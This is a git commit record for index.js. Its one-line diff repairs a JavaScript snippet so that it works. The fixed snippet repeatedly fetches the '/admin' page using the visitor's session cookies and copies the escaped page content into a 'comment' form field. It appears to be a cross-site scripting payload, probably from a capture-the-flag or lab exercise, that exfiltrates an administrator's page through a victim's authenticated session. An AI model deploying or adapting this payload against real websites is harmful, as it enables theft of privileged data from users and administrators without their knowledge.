a6975211d2d3ad067b6c23e8f281e12e9f2234be
BenTechy Service Account <123170249+bentechy-service-account@users.noreply.github.com>
2023-05-04 21:58:29 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,1 @@
-setInterval(() => () => {fetch("/admin", {"credentials": "include"}).then(res => res.text()).then(x => {document.getElementById("comment").value = x.replaceAll("<", "&lt;").replaceAll(">", "&gt;");})}, 1);
+setInterval(() => {fetch("/admin", {"credentials": "include"}).then(res => res.text()).then(x => {document.getElementById("comment").value = x.replaceAll("<", "&lt;").replaceAll(">", "&gt;");})}, 1);
